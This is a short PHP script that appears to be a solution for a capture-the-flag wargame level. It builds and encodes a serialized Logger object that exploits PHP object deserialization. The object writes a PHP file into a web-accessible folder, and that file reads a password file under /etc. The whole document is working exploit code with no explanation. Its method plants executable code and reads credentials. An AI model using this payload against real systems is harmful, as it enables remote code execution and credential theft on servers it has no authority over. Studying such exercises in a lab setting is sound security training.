<?
    class Logger{
        private $logFile = "img/password.php";
        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>";
    }

    print urlencode(base64_encode(serialize(new Logger)));
?>